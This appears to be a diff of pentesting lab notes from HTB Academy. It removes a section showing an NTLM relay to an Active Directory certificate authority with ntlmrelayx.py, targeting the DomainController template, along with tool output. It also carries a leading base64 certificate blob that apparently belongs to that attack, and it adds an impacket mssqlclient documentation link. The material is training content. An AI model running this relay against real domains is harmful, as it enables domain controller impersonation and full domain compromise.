bnDneA2MihPJ0+7m+R9gac12aWpYsuCnz8nD6b8HPh2NVfFF+a7OEtNITSiN6sXcPb9YyEbzPYw7XjWQtLvYjDzgofP8stRSWz3lVVQOTyrcR7BdFebNWM8+g60AYBVEHT4wMQwYaI4H7I4LQEYfZlD7dU/Ln7qqiPBrohyqHcZcTh8vC5JazCB3CwNNsE4q431lwH1GW9Onqc++/HhF/GVRPfmacl1Bn3nNqYwmMcAhsnfgs8uDR9cItwh41T7STSDTU56rFRc86JYwbzEGCICHwgeh+s5Yb+7z9u+5HSy5QBObJeu5EIjVnu1eVWfEYs/Ks6FI3D/MMJFs+PcAKaVYCKYlA3sx9+83gk0NlAb9b1DrLZnNYd6CLq2N6Pew6hMSUwIwYJKoZIhvcNAQkVMRYEFLqyF797X2SL//FR1NM+UQsli2GgMC0wITAJBgUrDgMCGgUABBQ84uiZwm1Pz70+e0p2GZNVZDXlrwQIyr7YCKBdGmY=
-[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
-
-<SNIP>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Historical AD Vulnerability Labs — Catching Base64 Encoded Certificate for DC01](/active-directory/historical-vulnerability-labs#catching-base64-encoded-certificate-for-dc01)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Starting ntlmrelayx.py">
-
-### Starting ntlmrelayx.py
-
-**Historical AD Vulnerability Labs · older reference**
-
-```shellsession
-grcic550@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
-
-Impacket v0.9.24.dev1+20211013.152215.3fe2d73a -
-
-Copyright 2021 SecureAuth Corporation
-
-[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
-[*] Protocol Client DCSYNC loaded..
-[*] Protocol Client HTTP loaded..
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client IMAPS loaded..
-[*] Protocol Client IMAP loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client MSSQL loaded..
-[*] Protocol Client RPC loaded..
-[*] Protocol Client SMB loaded..
-[*] Protocol Client SMTP loaded..
-[+] Protocol Attack DCSYNC loaded..
-[+] Protocol Attack HTTP loaded..
-[+] Protocol Attack HTTPS loaded..
-[+] Protocol Attack IMAP loaded..
-[+] Protocol Attack IMAPS loaded..
-[+] Protocol Attack LDAP loaded..
-[+] Protocol Attack LDAPS loaded..
-[+] Protocol Attack MSSQL loaded..
-[+] Protocol Attack RPC loaded..
-[+] Protocol Attack SMB loaded..
-[*] Running in relay mode to single host
-[*] Setting up SMB Server
-[*] Setting up HTTP Server
-[*] Setting up WCF Server
-
-[*] Servers started, waiting for connections
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Historical AD Vulnerability Labs — Starting ntlmrelayx.py](/active-directory/historical-vulnerability-labs#starting-ntlmrelayx-py)
+**Original note sections:** [Recon & Services: Enumeration Methodology — SNMP and databases](/enumeration/methodology#snmp-and-databases)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -857,6 +511,10 @@ Copyright 2021 SecureAuth Corporation
 </Accordion>
 
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
 
 {/* VAULT_RELATED_START */}
 
@@ -866,5 +524,3 @@ Copyright 2021 SecureAuth Corporation
 - [Attacking SQL Databases: Module Notes](/modules/common-services/sql)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
